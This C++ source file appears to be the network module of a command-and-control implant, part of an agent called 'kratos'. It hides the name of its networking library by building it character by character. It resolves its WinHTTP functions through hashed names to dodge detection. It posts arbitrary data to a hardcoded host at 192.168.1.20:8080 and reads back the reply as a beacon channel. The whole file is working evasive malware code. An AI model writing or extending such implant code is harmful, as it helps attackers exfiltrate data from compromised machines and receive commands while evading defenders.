#include "net/net.h"
#include "agent/core.h"

NetMgr* net = NULL;

#define RECV_INTIAL_SIZE (64*1024)
#define RECV_MAX_SIZE    (1024 * 1024)

NetMgr::NetMgr() {
	CHAR dll[ 12 ];
	dll[  0  ]  = 'w';
	dll[  1  ]  = 'i';
	dll[  2  ]  = 'n';
	dll[  3  ]  = 'h';
	dll[  4  ]  = 't';
	dll[  5  ]  = 't';
	dll[  6  ]  = 'p';
	dll[  7  ]  = '.';
	dll[  8  ]  = 'd';
	dll[  9  ]  = 'l';
	dll[ 10  ]  = 'l';
	dll[ 11  ]  = '\0';
	this->WinHttpDll = kratos->apis.LoadLibraryA( dll );

	if ( this->WinHttpDll ) {
		this->apis.WinHttpOpen               = ( decltype( this->apis.WinHttpOpen               ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpOpen" ) );
		this->apis.WinHttpConnect            = ( decltype( this->apis.WinHttpConnect            ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpConnect"  ) );
		this->apis.WinHttpOpenRequest        = ( decltype( this->apis.WinHttpOpenRequest        ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpOpenRequest"));
		this->apis.WinHttpSendRequest        = ( decltype( this->apis.WinHttpSendRequest        ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpSendRequest"));
		this->apis.WinHttpReadData           = ( decltype( this->apis.WinHttpReadData           ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpReadData"));
		this->apis.WinHttpCloseHandle        = ( decltype( this->apis.WinHttpCloseHandle        ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpCloseHandle"));
		this->apis.WinHttpReceiveResponse    = ( decltype( this->apis.WinHttpReceiveResponse    ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpReceiveResponse"));
		this->apis.WinHttpQueryDataAvailable = ( decltype( this->apis.WinHttpQueryDataAvailable ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpQueryDataAvailable"));
		DEBUG_LOG("[+] Loaded winhttp dlls");
	}
	else {
		DEBUG_LOG("[!] Failed loading winhttp");

		//return FALSE;
	}

	this->RecvBuf = ( PBYTE )kratos->apis.LocalAlloc( ALLOC_ARGS, RECV_INTIAL_SIZE );
	//if ( ! this->RecvBuf ) { return FALSE; }
	this->recvLen = 0;
	this->recvCap = RECV_INTIAL_SIZE;

	//return TRUE;
}



BOOL NetMgr::EnsureRecv( SIZE_T needed ) {
	if ( needed > RECV_MAX_SIZE ) { return FALSE; }
	
	if ( needed <= this->recvCap ) { return TRUE; }

	SIZE_T newCap = this->recvCap ? this->recvCap : RECV_INTIAL_SIZE;

	while ( newCap < needed ) {
		if ( newCap > RECV_MAX_SIZE / 2 ) {
			newCap = RECV_MAX_SIZE;
			break;
		}
		newCap *= 2;
	}

	PBYTE p = ( PBYTE )kratos->apis.LocalReAlloc( this->RecvBuf, newCap, ALLOC_ARGS );
	if ( ! p ) { return FALSE; }

	this->RecvBuf = p;
	this->recvCap = newCap;
	return TRUE;
}



BOOL NetMgr::Post( PBYTE data, SIZE_T DataSize ) {
	HINTERNET hRequest = NULL, hSession = NULL, hConnect = NULL;
	DWORD avail = 0, total = 0, read = 0;
	BOOL sent = FALSE;

	DEBUG_LOG("[+] Posting Data...");

	hSession = this->apis.WinHttpOpen( NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
	if ( ! hSession ) { goto NEXT; }

	hConnect = this->apis.WinHttpConnect( hSession, L"192.168.1.20", 8080, 0 );
	if ( ! hConnect ) { goto NEXT; }

	hRequest = this->apis.WinHttpOpenRequest( hConnect, L"POST", L"/index.php", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0 );
	if ( ! hRequest) { goto NEXT; }

	if ( ! this->apis.WinHttpSendRequest( hRequest, NULL, 0, ( LPVOID )data, ( DWORD )DataSize, ( DWORD )DataSize, 0 ) ) {
		DEBUG_LOG("[+] Failed Sending Request");
		goto NEXT;
	}

	if ( ! this->apis.WinHttpReceiveResponse( hRequest, NULL ) ) { goto NEXT; }

	for ( ;; ) {
		if ( ! this->apis.WinHttpQueryDataAvailable(hRequest, &avail ) ) { goto NEXT; }

		if ( avail == 0 ) { break; }

		if ( ! this->EnsureRecv( total + avail ) ) { goto NEXT; }

		read = 0;
		if ( ! this->apis.WinHttpReadData( hRequest, this->RecvBuf + total, avail, &read ) ) { goto NEXT; }

		if (read == 0) { break; }
		total += read;
	}
	this->recvLen = total;
	sent = TRUE;

NEXT:
	if ( hRequest ) { this->apis.WinHttpCloseHandle( hRequest ); }
	if ( hConnect ) { this->apis.WinHttpCloseHandle( hConnect ); }
	if ( hSession ) { this->apis.WinHttpCloseHandle( hSession ); }

	return sent;
}




PBYTE NetMgr::Data( ) {
	return this->RecvBuf;
}

SIZE_T NetMgr::DataSize( ) {
	return this->recvLen;
}